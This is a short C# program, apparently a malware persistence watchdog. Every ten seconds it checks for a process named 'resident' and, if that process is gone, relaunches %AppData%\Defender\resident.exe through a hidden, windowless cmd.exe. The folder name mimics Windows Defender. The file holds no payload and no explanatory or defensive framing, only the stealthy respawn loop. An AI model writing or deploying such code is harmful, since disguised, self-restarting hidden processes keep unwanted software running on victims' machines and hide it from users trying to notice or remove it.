using System;
using System.Diagnostics;
using System.Threading;

namespace screen
{
	class Program
	{
		static void Main( string[] args )
		{
			while ( true )
			{
				if ( Process.GetProcessesByName( "resident" ).Length == 0 )
				{
					var startInfo = new ProcessStartInfo( );
					startInfo.CreateNoWindow = true;
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.FileName = "cmd.exe";
					startInfo.Arguments = $"/C start {Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Defender\\resident.exe";
					Process.Start( startInfo );
				}
				Thread.Sleep( 10000 );
			}
		}
	}
}
